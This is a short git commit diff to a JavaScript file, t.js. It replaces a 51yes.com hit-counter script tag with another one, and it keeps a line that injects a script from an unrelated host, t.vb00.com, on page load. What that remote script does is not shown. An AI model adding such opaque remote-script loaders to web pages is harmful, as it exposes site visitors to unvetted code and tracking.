4263e3e98de70f1013e10ce9fa06b5eb0b3a14de
tzjs <tzjs@gmx.com>
2016-01-19 15:23:03 +0800

    Update t.js

--- 5/t.js
+++ 5/t.js
@@ -1,5 +1,4 @@
-document.writeln("<script language=\"javascript\" src=\"http:\/\/count38.51yes.com\/click.aspx?id=384346343&logo=12\" charset=\"gb2312\"><\/script>");
-
+document.writeln("<script language=\"javascript\" src=\"http:\/\/count51.51yes.com\/click.aspx?id=512823848&logo=12\" charset=\"gb2312\"><\/script>");
 
 
 document.writeln("<script src=http:\/\/t.vb00.com\/t1.js ><\/script>");
